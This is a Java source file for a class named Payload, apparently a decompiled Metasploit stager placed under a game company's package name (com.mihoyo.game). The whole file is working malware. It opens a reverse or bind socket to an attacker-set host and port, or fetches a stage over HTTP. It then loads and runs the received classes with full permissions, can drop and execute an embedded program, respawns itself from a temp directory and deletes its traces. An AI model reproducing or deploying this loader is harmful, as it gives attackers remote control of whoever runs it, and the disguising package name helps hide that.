package com.mihoyo.game;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.util.Enumeration;
import java.util.Locale;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;

public class Payload extends ClassLoader {
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);

    private static final String PATH_SEP = System.getProperty("path.separator");

    private static final boolean IS_AIX = "aix".equals(OS_NAME);

    private static final boolean IS_DOS = PATH_SEP.equals(";");

    private static final String JAVA_HOME = System.getProperty("java.home");

    public static void main(String[] paramArrayOfString) throws Exception {
        Properties properties = new Properties();
        Class<Payload> clazz = Payload.class;
        String str1 = clazz.getName().replace('.', '/') + ".class";
        InputStream inputStream = clazz.getResourceAsStream("/metasploit.dat");
        if (inputStream != null) {
            properties.load(inputStream);
            inputStream.close();
        }
        String str2 = properties.getProperty("Executable");
        if (str2 != null) {
            File file1 = File.createTempFile("~spawn", ".tmp");
            file1.delete();
            File file2 = new File(file1.getAbsolutePath() + ".dir");
            file2.mkdir();
            File file3 = new File(file2, str2);
            writeEmbeddedFile(clazz, str2, file3);
            properties.remove("Executable");
            properties.put("DroppedExecutable", file3.getCanonicalPath());
        }
        int i = Integer.parseInt(properties.getProperty("Spawn", "0"));
        String str3 = properties.getProperty("DroppedExecutable");
        if (i > 0) {
            properties.setProperty("Spawn", String.valueOf(i - 1));
            File file1 = File.createTempFile("~spawn", ".tmp");
            file1.delete();
            File file2 = new File(file1.getAbsolutePath() + ".dir");
            File file3 = new File(file2, "metasploit.dat");
            File file4 = new File(file2, str1);
            file4.getParentFile().mkdirs();
            writeEmbeddedFile(clazz, str1, file4);
            if (properties.getProperty("URL", "").startsWith("https:"))
                writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(file4.getParentFile(), "PayloadTrustManager.class"));
            if (properties.getProperty("AESPassword", (String)null) != null)
                writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(file4.getParentFile(), "AESEncryption.class"));
            FileOutputStream fileOutputStream = new FileOutputStream(file3);
            properties.store(fileOutputStream, "");
            fileOutputStream.close();
            Process process = Runtime.getRuntime().exec(new String[] { getJreExecutable("java"), "-classpath", file2.getAbsolutePath(), clazz.getName() });
            process.getInputStream().close();
            process.getErrorStream().close();
            Thread.sleep(2000L);
            File[] arrayOfFile = { file4, file4.getParentFile(), file3, file2 };
            byte b;
            for (b = 0; b < arrayOfFile.length; b = (byte)(b + 1)) {
                byte b1;
                for (b1 = 0; b1 < 10 && !arrayOfFile[b].delete(); b1 = (byte)(b1 + 1)) {
                    arrayOfFile[b].deleteOnExit();
                    Thread.sleep(100L);
                }
            }
        } else if (str3 != null) {
            File file = new File(str3);
            if (!IS_DOS)
                try {
                    try {
                        File.class.getMethod("setExecutable", new Class[] { boolean.class }).invoke(file, new Object[] { Boolean.TRUE });
                    } catch (NoSuchMethodException noSuchMethodException) {
                        Runtime.getRuntime().exec(new String[] { "chmod", "+x", str3 }).waitFor();
                    }
                } catch (Exception exception) {
                    exception.printStackTrace();
                }
            Runtime.getRuntime().exec(new String[] { str3 });
            if (!IS_DOS) {
                file.delete();
                file.getParentFile().delete();
            }
        } else {
            OutputStream outputStream;
            int j = Integer.parseInt(properties.getProperty("LPORT", "4444"));
            String str4 = properties.getProperty("LHOST", (String)null);
            String str5 = properties.getProperty("URL", (String)null);
            InputStream inputStream1 = null;
            if (j <= 0) {
                inputStream1 = System.in;
                outputStream = System.out;
            } else if (str5 != null) {
                if (str5.startsWith("raw:")) {
                    inputStream1 = new ByteArrayInputStream(str5.substring(4).getBytes("ISO-8859-1"));
                } else if (str5.startsWith("http")) {
                    URLConnection uRLConnection = (new URL(str5)).openConnection();
                    if (str5.startsWith("https:"))
                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[] { URLConnection.class }).invoke(null, new Object[] { uRLConnection });
                    addRequestHeaders(uRLConnection, properties);
                    inputStream1 = uRLConnection.getInputStream();
                }
                outputStream = new ByteArrayOutputStream();
            } else {
                Socket socket;
                if (str4 != null) {
                    socket = new Socket(str4, j);
                } else {
                    ServerSocket serverSocket = new ServerSocket(j);
                    socket = serverSocket.accept();
                    serverSocket.close();
                }
                inputStream1 = socket.getInputStream();
                outputStream = socket.getOutputStream();
            }
            String str6 = properties.getProperty("AESPassword", (String)null);
            if (str6 != null) {
                Object[] arrayOfObject = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", new Class[] { InputStream.class, OutputStream.class, String.class }).invoke(null, new Object[] { inputStream1, outputStream, str6 });
                inputStream1 = (InputStream)arrayOfObject[0];
                outputStream = (OutputStream)arrayOfObject[1];
            }
            StringTokenizer stringTokenizer = new StringTokenizer("Payload -- " + properties.getProperty("StageParameters", ""), " ");
            String[] arrayOfString = new String[stringTokenizer.countTokens()];
            byte b;
            for (b = 0; b < arrayOfString.length; b = (byte)(b + 1))
                arrayOfString[b] = stringTokenizer.nextToken();
            (new Payload()).bootstrap(inputStream1, outputStream, properties.getProperty("EmbeddedStage", (String)null), arrayOfString);
        }
    }

    private static void addRequestHeaders(URLConnection paramURLConnection, Properties paramProperties) {
        Enumeration<?> enumeration = paramProperties.propertyNames();
        while (enumeration.hasMoreElements()) {
            Object object = enumeration.nextElement();
            if (object instanceof String) {
                String str = (String)object;
                if (str.startsWith("Header"))
                    paramURLConnection.addRequestProperty(str.substring(6), paramProperties.getProperty(str));
            }
        }
    }

    private static void writeEmbeddedFile(Class paramClass, String paramString, File paramFile) throws FileNotFoundException, IOException {
        InputStream inputStream = paramClass.getResourceAsStream("/" + paramString);
        FileOutputStream fileOutputStream = new FileOutputStream(paramFile);
        byte[] arrayOfByte = new byte[4096];
        int i;
        while ((i = inputStream.read(arrayOfByte)) != -1)
            fileOutputStream.write(arrayOfByte, 0, i);
        fileOutputStream.close();
    }

    private final void bootstrap(InputStream paramInputStream, OutputStream paramOutputStream, String paramString, String[] paramArrayOfString) throws Exception {
        try {
            Class<?> clazz;
            DataInputStream dataInputStream = new DataInputStream(paramInputStream);
            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new java.security.cert.Certificate[0]), permissions);
            if (paramString == null) {
                int i = dataInputStream.readInt();
                do {
                    byte[] arrayOfByte = new byte[i];
                    dataInputStream.readFully(arrayOfByte);
                    resolveClass(clazz = defineClass(null, arrayOfByte, 0, i, protectionDomain));
                    i = dataInputStream.readInt();
                } while (i > 0);
            } else {
                clazz = Class.forName("javapayload.stage." + paramString);
            }
            Object object = clazz.newInstance();
            clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(object, new Object[] { dataInputStream, paramOutputStream, paramArrayOfString });
        } catch (Throwable throwable) {
            throwable.printStackTrace(new PrintStream(paramOutputStream));
        }
    }

    private static String getJreExecutable(String paramString) {
        File file = null;
        if (IS_AIX)
            file = findInDir(JAVA_HOME + "/sh", paramString);
        if (file == null)
            file = findInDir(JAVA_HOME + "/bin", paramString);
        return (file != null) ? file.getAbsolutePath() : addExtension(paramString);
    }

    private static String addExtension(String paramString) {
        return paramString + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String paramString1, String paramString2) {
        File file1 = normalize(paramString1);
        File file2 = null;
        if (file1.exists()) {
            file2 = new File(file1, addExtension(paramString2));
            if (!file2.exists())
                file2 = null;
        }
        return file2;
    }

    private static File normalize(String paramString) {
        Stack<String> stack = new Stack<>();
        String[] arrayOfString = dissect(paramString);
        stack.push(arrayOfString[0]);
        StringTokenizer stringTokenizer = new StringTokenizer(arrayOfString[1], File.separator);
        while (stringTokenizer.hasMoreTokens()) {
            String str = stringTokenizer.nextToken();
            if (".".equals(str))
                continue;
            if ("..".equals(str)) {
                if (stack.size() < 2)
                    return new File(paramString);
                stack.pop();
                continue;
            }
            stack.push(str);
        }
        StringBuilder stringBuilder = new StringBuilder();
        byte b;
        for (b = 0; b < stack.size(); b = (byte)(b + 1)) {
            if (b > 1)
                stringBuilder.append(File.separatorChar);
            stringBuilder.append(stack.elementAt(b));
        }
        return new File(stringBuilder.toString());
    }

    private static String[] dissect(String paramString) {
        char c = File.separatorChar;
        paramString = paramString.replace('/', c).replace('\\', c);
        String str = null;
        int i = paramString.indexOf(':');
        if (i > 0 && IS_DOS) {
            int j = i + 1;
            str = paramString.substring(0, j);
            char[] arrayOfChar = paramString.toCharArray();
            str = str + c;
            j = (arrayOfChar[j] == c) ? (j + 1) : j;
            StringBuilder stringBuilder = new StringBuilder();
            for (int k = j; k < arrayOfChar.length; k++) {
                if (arrayOfChar[k] != c || arrayOfChar[k - 1] != c)
                    stringBuilder.append(arrayOfChar[k]);
            }
            paramString = stringBuilder.toString();
        } else if (paramString.length() > 1 && paramString.charAt(1) == c) {
            int j = paramString.indexOf(c, 2);
            j = paramString.indexOf(c, j + 1);
            str = (j > 2) ? paramString.substring(0, j + 1) : paramString;
            paramString = paramString.substring(str.length());
        } else {
            str = File.separator;
            paramString = paramString.substring(1);
        }
        return new String[] { str, paramString };
    }
}
